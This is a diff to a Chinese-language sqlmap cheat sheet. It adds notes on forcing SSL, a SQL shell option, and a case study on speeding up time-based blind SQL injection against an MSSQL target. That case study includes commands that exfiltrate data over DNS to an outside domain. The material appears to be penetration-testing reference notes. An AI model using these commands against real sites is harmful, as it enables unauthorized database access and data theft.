@@ -25,14 +25,13 @@ tampers是sqlmap自带的绕过WAF的脚本，可查看所有tampers:
 
 #### 常用参数 - 强制ssl
 
-待测网站通常是https协议 
+强制使用ssl协议 `--force-ssl`
 
-可能出现404`[CRITICAL] page not found (404)`
+适用场景:
+待测网站通常是https协议,但可能被sqlmap识别为http协议并出现报错 404`[CRITICAL] page not found (404)`
 
-加上参数即可`--force-ssl`
-
-（在Host头最后加上`:443`这种办法一般可行但有局限性，实测中有8443端口的https无法用该方法解决）
-
+>另一种不太通用的办法:手工修改请求
+>把Host头最后加上`:443`可被sqlmap识别为ssl协议,这种办法一般可行但有局限性. 实测中有8443端口的SSL端口，如果在Host头最后加上`:8443`，仍然会被sqlmap当作HTTP协议的端口
 
 #### 常用参数 - 加快测试速度
 
@@ -86,6 +85,14 @@ sqlmap -u xxx.com/index.php/Index/view/id/40*.html --dbs
 ```
 
 -r 也是在请求包文件中的参数值后面加*号
+
+
+#### 参数 - sql命令行
+
+```
+--sql-shell
+
+```
 
 #### 参数 - OS命令执行
 
@@ -380,13 +387,16 @@ Options:
 
 ### 案例1
 
-基于时间的盲注，如何加速获取数据
+windows服务器的web应用存在SQLi 基于时间的盲注 如何快速获取数据?
+
+原理参考[类型6 - "带外"(out-of-band)](web_vul_sqli.md#类型6---带外out-of-band)
 
 ```
-# 基于时间的盲注 - 方法1: 根据延时来跑数据(很慢)
+# 基于时间的盲注 - 拿数据方法1: 根据延时来跑数据(很慢)
 python sqlmap.py -u "http://vul.com/test.php?id=1" -p uid --tech=T --dbms mssql --dbs
 
-# 基于时间的盲注 - 方法2: 使用带外请求(OOB) 利用DNS跑数据(很快)
+# 基于时间的盲注 - 拿数据方法2: 使用带外请求(OOB) 利用DNS exfiltration跑数据(很快)
 # 假设本机的公网ip为114.1.1.1  就在本机运行sqlmap
-python sqlmap.py -u "http://vul.com/test.php?id=1" -p uid --tech=T --dbms=mssql --dbs --dns-domain=114.1.1.1.xip.io
+python sqlmap.py -u "http://vul.com/test.php?id=1" -p uid --dbms=mssql --dbs --dns-domain=YOUR.com
+[16:25:22] [INFO] testing for data retrieval through DNS channel
 ```
